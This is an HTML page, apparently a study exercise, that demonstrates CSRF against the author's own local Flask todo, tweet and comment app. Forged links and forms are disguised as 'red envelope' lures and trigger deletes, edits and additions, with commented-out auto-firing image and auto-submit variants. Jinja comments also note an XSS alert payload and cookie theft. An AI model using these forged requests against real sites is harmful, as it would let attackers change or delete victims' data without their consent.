<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>CSRF</title>
</head>
<body>
<img src="http://p5shjfo1t.bkt.clouddn.com/hack.jpg">
<!--用户不点击也中招-->
<!--<img src="http://0.0.0.0:4000/todo/delete/3">-->
<!--通过cookie，再伪造request删除/add用户数据-->

<h3>test todo</h3>
<a href="http://0.0.0.0:4000/todo/edit/7">
    点击edit红包
</a>
<br>
<a href="http://0.0.0.0:4000/todo/delete/7">
    点击delete红包
</a>


<form action="http://0.0.0.0:4000/todo/add" method="post">
    <input type="text" value="from hack add" name="title" placeholder="请输入todo">
    <br>
    <button id="add" type="submit">点击add红包</button>
</form>

<form action="http://0.0.0.0:4000/todo/update" method="post">
    <input name="id" placeholder="id" value="7">
    <br>
    <input type="text" value="from hack update" name="title" placeholder="请输入todo">
    <br>
    <button id="update" type="submit">点击update红包</button>
</form>
    <br>
    <a href="http://0.0.0.0:4000/todo/status_switch/9?status=True">设置为-完成</a>
    <a href="http://0.0.0.0:4000/todo/status_switch/9?status=False">设置为-未完成</a>


<h3>test tweet</h3>

<a href="http://0.0.0.0:4000/tweet/edit/4">
    点击edit红包
</a>
<br>
<a href="http://0.0.0.0:4000/tweet/delete/4">
    点击delete红包
</a>

<br>
<a href="http://0.0.0.0:4000/tweet/new">
    点击去new红包
</a>
<br>
<form action="http://0.0.0.0:4000/tweet/add" method="post">
        <input name="content">
        <br>
        <button type="submit">点击add红包</button>
</form>

<form action="http://0.0.0.0:4000/tweet/update" method="post">
    <input name="id" value="4" type="hidden">
    <input name="content">
    <button type="submit">点击update红包</button>
</form>

<h3>test comment</h3>

<a href="http://0.0.0.0:4000/comment/delete/6">点击delete红包</a>
<br>
<a href="http://0.0.0.0:4000/comment/edit/6">点击edit红包</a>
<br>
<form action="http://0.0.0.0:4000/comment/update" method="post">
    <input name="id" value="6" type="hidden">
    <input name="content" value="from hack again">
    <button type="submit">点击update红包</button>
</form>
<br>
 <form action="http://0.0.0.0:4000/comment/add" method="post">
            <input type="hidden" name="tweet_id" value="5">
            <input name="content">
            <br>
            <button type="submit">点击add红包</button>
</form>

<script>
    {#自动提交#}
    {#这是jinja模板的注释😥#}

    {#let e = function(sel) {#}
    {#    return document.querySelector(sel)#}
    {#}#}
    {##}
    {#e('#add').click()#}
</script>

</body>
</html>

{#XSS#}
{#<script>alert('hello')</script>#}
{#打开safe模式,add如上todo，会被执行XSS脚本,
XSS可以有很多种:改背景颜色啦，
偷cookie(flask默认做了安全防范，js代码不能拿到cookie，但是知乎就可以)#}
{#<h3>{{ t.id }} : {{ t.title | safe}}#}
{#不打开safe模式<>符号会被&lt; &gt;代替#}
